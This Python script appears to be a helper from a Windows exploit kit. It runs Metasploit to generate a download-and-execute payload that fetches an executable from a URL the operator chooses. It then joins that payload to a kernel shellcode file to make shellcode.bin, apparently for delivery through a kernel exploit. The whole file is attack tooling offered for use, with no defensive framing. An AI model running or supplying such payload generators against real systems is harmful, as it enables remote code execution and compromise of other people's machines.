#!/usr/bin/python
import os
from time import sleep

def main():
	url = raw_input("[*] URL which your EXE is hosted in (e.g. http://192.168.1.8:8080/file.exe): ")
	exe = raw_input("[*] Filename you want the EXE to be saved as in targets: ")

	os.system("msfconsole -q -x 'use payload/windows/download_exec; set EXITFUNC thread; set EXE {}; set URL {}; generate -f raw -o sc_msf.bin;exit'".format(exe, url))
	print '[*] Generating shellcode...'
	sleep(2)
	os.system("cat sc_x86_kernel.bin sc_msf.bin > shellcode.bin")

if __name__ == '__main__':
	main()
